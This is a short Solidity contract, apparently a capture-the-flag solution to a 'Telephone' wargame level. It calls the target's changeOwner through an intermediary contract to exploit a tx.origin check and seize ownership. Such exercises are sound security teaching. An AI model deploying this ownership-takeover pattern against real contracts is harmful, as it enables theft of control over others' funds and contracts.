import "./Telephone.sol";

pragma solidity ^0.4.18;

contract AttackTelephone {
    Telephone public telephone;

    function AttackTelephone(address _telephone) public {
        telephone = Telephone(_telephone);
    }

    function hack() public {
        telephone.changeOwner(msg.sender);
    }
}
